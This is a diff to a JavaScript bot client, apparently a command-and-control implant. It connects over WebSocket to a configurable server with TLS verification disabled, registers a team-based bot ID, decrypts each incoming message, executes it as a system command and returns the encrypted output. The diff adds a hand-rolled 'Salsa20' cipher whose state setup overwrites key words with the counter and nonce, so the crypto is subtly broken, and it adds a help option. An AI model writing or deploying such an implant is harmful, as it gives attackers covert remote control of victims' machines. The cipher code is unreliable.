@@ -16,12 +16,158 @@ const SALSA20_IV = Buffer.from([
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 ]);
 
+const TAU = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];
+const SIGMA = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];
+
+function rol32(a, b) {
+  return ((a << b) | (a >>> (32 - b))) >>> 0;
+}
+
+function littleEndian(buffer, index) {
+  return buffer[index] | (buffer[index + 1] << 8) | (buffer[index + 2] << 16) | (buffer[index + 3] << 24);
+}
+
+function toLittleEndian(a, buffer, index) {
+  buffer[index] = a & 0xff;
+  buffer[index + 1] = (a >>> 8) & 0xff;
+  buffer[index + 2] = (a >>> 16) & 0xff;
+  buffer[index + 3] = (a >>> 24) & 0xff;
+}
+
+function salsa20Core(input, output) {
+  let x0 = input[0],
+      x1 = input[1],
+      x2 = input[2],
+      x3 = input[3],
+      x4 = input[4],
+      x5 = input[5],
+      x6 = input[6],
+      x7 = input[7],
+      x8 = input[8],
+      x9 = input[9],
+      x10 = input[10],
+      x11 = input[11],
+      x12 = input[12],
+      x13 = input[13],
+      x14 = input[14],
+      x15 = input[15];
+  
+  for (let i = 0; i < 10; i++) {
+    x4 ^= rol32(x0 + x12, 7);
+    x8 ^= rol32(x4 + x0, 9);
+    x12 ^= rol32(x8 + x4, 13);
+    x0 ^= rol32(x12 + x8, 18);
+    
+    x9 ^= rol32(x5 + x1, 7);
+    x13 ^= rol32(x9 + x5, 9);
+    x1 ^= rol32(x13 + x9, 13);
+    x5 ^= rol32(x1 + x13, 18);
+    
+    x14 ^= rol32(x10 + x6, 7);
+    x2 ^= rol32(x14 + x10, 9);
+    x6 ^= rol32(x2 + x14, 13);
+    x10 ^= rol32(x6 + x2, 18);
+    
+    x3 ^= rol32(x15 + x11, 7);
+    x7 ^= rol32(x3 + x15, 9);
+    x11 ^= rol32(x7 + x3, 13);
+    x15 ^= rol32(x11 + x7, 18);
+    
+    x1 ^= rol32(x0 + x3, 7);
+    x2 ^= rol32(x1 + x0, 9);
+    x3 ^= rol32(x2 + x1, 13);
+    x0 ^= rol32(x3 + x2, 18);
+    
+    x6 ^= rol32(x5 + x4, 7);
+    x7 ^= rol32(x6 + x5, 9);
+    x4 ^= rol32(x7 + x6, 13);
+    x5 ^= rol32(x4 + x7, 18);
+    
+    x11 ^= rol32(x10 + x9, 7);
+    x8 ^= rol32(x11 + x10, 9);
+    x9 ^= rol32(x8 + x11, 13);
+    x10 ^= rol32(x9 + x8, 18);
+    
+    x12 ^= rol32(x15 + x14, 7);
+    x13 ^= rol32(x12 + x15, 9);
+    x14 ^= rol32(x13 + x12, 13);
+    x15 ^= rol32(x14 + x13, 18);
+  }
+  
+  output[0] = x0 + input[0];
+  output[1] = x1 + input[1];
+  output[2] = x2 + input[2];
+  output[3] = x3 + input[3];
+  output[4] = x4 + input[4];
+  output[5] = x5 + input[5];
+  output[6] = x6 + input[6];
+  output[7] = x7 + input[7];
+  output[8] = x8 + input[8];
+  output[9] = x9 + input[9];
+  output[10] = x10 + input[10];
+  output[11] = x11 + input[11];
+  output[12] = x12 + input[12];
+  output[13] = x13 + input[13];
+  output[14] = x14 + input[14];
+  output[15] = x15 + input[15];
+}
+
+function setupState(key, nonce, counter) {
+  const state = new Uint32Array(16);
+  
+  state[0] = SIGMA[0];
+  state[1] = SIGMA[1];
+  state[2] = SIGMA[2];
+  state[3] = SIGMA[3];
+  
+  for (let i = 0; i < 8; i++) {
+    state[4 + i] = littleEndian(key, i * 4);
+  }
+  
+  state[8] = counter & 0xffffffff;
+  state[9] = (counter >>> 32) & 0xffffffff;
+  
+  for (let i = 0; i < 2; i++) {
+    state[10 + i] = littleEndian(nonce, i * 4);
+  }
+  
+  return state;
+}
+
+function salsa20Encrypt(data, key, nonce, counter = 0) {
+  const result = Buffer.allocUnsafe(data.length);
+  const state = setupState(key, nonce, counter);
+  const block = new Uint32Array(16);
+  
+  for (let i = 0; i < data.length; i += 64) {
+    salsa20Core(state, block);
+    
+    state[8] = (state[8] + 1) >>> 0;
+    if (state[8] === 0) {
+      state[9] = (state[9] + 1) >>> 0;
+    }
+    
+    const blockBytes = new Uint8Array(64);
+    for (let j = 0; j < 16; j++) {
+      toLittleEndian(block[j], blockBytes, j * 4);
+    }
+    
+    for (let j = 0; j < 64 && i + j < data.length; j++) {
+      result[i + j] = data[i + j] ^ blockBytes[j];
+    }
+  }
+  
+  return result;
+}
+
+function salsa20Decrypt(data, key, nonce, counter = 0) {
+  return salsa20Encrypt(data, key, nonce, counter);
+}
+
 function encryptSalsa20(message) {
   try {
-    const cipher = crypto.createCipheriv('chacha20', SALSA20_KEY, SALSA20_IV);
-    let encrypted = cipher.update(message, 'utf8');
-    encrypted = Buffer.concat([encrypted, cipher.final()]);
-    return encrypted;
+    const messageBuffer = Buffer.from(message, 'utf8');
+    return salsa20Encrypt(messageBuffer, SALSA20_KEY, SALSA20_IV);
   } catch (error) {
     console.error('Ошибка шифрования:', error);
     throw new Error('Ошибка шифрования сообщения');
@@ -30,9 +176,7 @@ function encryptSalsa20(message) {
 
 function decryptSalsa20(encrypted) {
   try {
-    const decipher = crypto.createDecipheriv('chacha20', SALSA20_KEY, SALSA20_IV);
-    let decrypted = decipher.update(encrypted);
-    decrypted = Buffer.concat([decrypted, decipher.final()]);
+    const decrypted = salsa20Decrypt(encrypted, SALSA20_KEY, SALSA20_IV);
     return decrypted.toString('utf8');
   } catch (error) {
     console.error('Ошибка дешифрования:', error);
@@ -51,7 +195,6 @@ function generateBotId() {
   
   return `${team}-${randomId}`;
 }
-
 
 function executeCommand(command) {
   console.log(`Выполнение команды: ${command}`);
@@ -146,6 +289,18 @@ function parseArguments() {
       i++;
     } else if (args[i] === '--debug') {
       options.debug = true;
+    } else if (args[i] === '--help') {
+      console.log(`
+Использование: node test-build.js [опции]
+
+Опции:
+  --host [hostname]  Хост сервера (по умолчанию: localhost)
+  --port [port]      Порт сервера (по умолчанию: 443)
+  --team [teamname]  Имя команды для botId (по умолчанию: team1)
+  --debug            Включить отладочные сообщения
+  --help             Показать эту справку
+`);
+      process.exit(0);
     }
   }
   
@@ -158,7 +313,7 @@ function connectToServer() {
   const botId = generateBotId();
   console.log(`Подключение к серверу wss://${options.host}:${options.port}`);
   console.log(`ID бота: ${botId}`);
-
+  
   process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
   
   const ws = new WebSocket(`wss://${options.host}:${options.port}`);
@@ -174,9 +329,11 @@ function connectToServer() {
     
     const header = Buffer.alloc(4);
     header.writeUInt32BE(2, 0);
+    
     ws.send(Buffer.concat([header, Buffer.from(botId)]));
     console.log('Авторизационные данные отправлены');
     
+
     const pingInterval = setInterval(() => {
       if (ws.readyState === WebSocket.OPEN) {
         if (options.debug) {
@@ -191,12 +348,13 @@ function connectToServer() {
   
   ws.on('message', (message) => {
     try {
+
       const decrypted = decryptSalsa20(message);
       console.log(`Получена команда: ${decrypted}`);
       
       const result = executeCommand(decrypted);
       console.log(`Результат выполнения: ${result.substring(0, 100)}${result.length > 100 ? '...' : ''}`);
-      
+
       const encrypted = encryptSalsa20(result);
       ws.send(encrypted);
     } catch (error) {
